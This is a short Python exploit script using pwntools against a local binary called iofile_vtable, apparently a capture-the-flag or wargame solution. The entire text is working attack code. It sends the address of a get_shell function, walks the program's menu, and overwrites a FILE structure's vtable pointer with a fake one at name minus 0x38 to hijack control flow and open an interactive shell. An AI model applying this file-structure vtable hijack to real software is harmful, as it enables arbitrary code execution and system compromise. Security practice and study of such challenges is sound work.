from pwn import *
p = process("./iofile_vtable")
pause()
elf = ELF("./iofile_vtable")
if __name__ == "__main__":
    p.sendline(p64(elf.symbols['get_shell']))
    p.sendline("4")
    p.sendline(p64(elf.symbols['name'] - 0x38))
    p.sendline("2")
    p.interactive()
